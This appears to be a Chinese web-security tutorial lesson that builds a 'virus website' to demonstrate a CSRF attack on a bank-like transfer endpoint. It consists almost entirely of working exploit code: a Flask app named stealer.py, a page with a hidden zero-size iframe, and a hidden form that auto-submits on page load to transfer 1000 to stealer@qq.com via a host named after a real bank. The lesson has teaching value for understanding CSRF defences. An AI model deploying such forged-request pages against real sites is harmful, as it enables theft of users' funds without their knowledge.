# 91 实战项目-病毒网站使用CSRF漏洞转账

## stealer.py

```text
from flask import Flask,render_template

app = Flask(__name__)


@app.route('/')
def index():
    return render_template('index.html')

@app.route('/transfer/')
def transfer():
    return render_template('transfer.html')


if __name__ == '__main__':
    app.run(debug=True,port=5001)
```

## index.html

```text
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>病毒网站</title>
</head>
<body>
    <img src="http://cms-bucket.nosdn.127.net/312e057a25f148519dc02b40812c78fe20170510155251.gif" alt="" width="100%" height="100%">
<iframe width="0" height="0" src="{{ url_for("transfer") }}" frameborder="0"></iframe>
</body>
</html>
```

## transfer.html

```text
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
     <script src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
</head>
<body>
    <form action="http://icbc.com:5000/transfer/" method="post" id="myform">
<table>
            <tbody>
                <tr>
{#                    <td>转到邮箱:</td>#}
                    <td><input type="hidden" name="email" value="stealer@qq.com"/></td>
                </tr>
                <tr>
{#                    <td>转到金额:</td>#}
                    <td><input type="hidden" name="money" value="1000"/></td>
                </tr>
                <tr>
                    <td></td>
                    <td><input type="submit" value="开始游戏"/></td>
                </tr>
            </tbody>
        </table>
    </form>
<script>
    $(function(){
        $("#myform").submit();
    });
</script>
</body>
</html>
```

